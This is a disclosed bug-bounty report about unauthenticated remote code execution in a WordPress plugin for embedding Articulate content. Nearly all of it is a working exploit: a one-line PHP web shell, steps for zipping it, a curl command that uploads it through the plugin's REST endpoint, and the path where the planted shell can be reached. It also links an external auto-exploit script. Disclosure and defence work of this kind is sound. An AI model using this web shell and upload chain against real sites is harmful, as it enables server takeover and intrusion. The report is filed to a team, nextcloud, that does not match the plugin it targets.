# WordPress Plugin Insert or Embed Articulate Content into WordPress Remote Code Execution (UNAUTHORIZED)

## Report Details
- **Report ID**: 696198
- **URL**: https://hackerone.com/reports/696198
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-09-17T03:52:56.149Z
- **Disclosed**: 2019-11-11T15:23:26.672Z

## Reporter
- **Username**: j4tayu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
because in the burp suite, the build request is complicated, I only use curl
1. Create file index.html and index.php

Index.html : 
<html>
Hello world
</html>

Index.php :
<?php
system($_GET[cmd]);
?>

2. Once created enter into .zip (COMPRESS)
3.  LETS UPLOAD
CURL :
curl site.com/index.php/wp-json/articulate/v1/upload-data -F "name={NAMAFILE}" -F "chunk={RANDOM}" -F "chunks={RANDOM}" -F "file=@YOURFILE.zip"
4. OK HERE, THERE IS A READING UPLOAD COMPLETE which means success
we try access to
site.com/PATH/ <PATH = PATH AT RESULT EX: site.com/wp-content/uploads/articulate_uploads/kntl17/index.php

For the autoxploiter https://pastebin.com/BEy5iDLA

## Impact

Remote code execution

## Attachments
No attachments
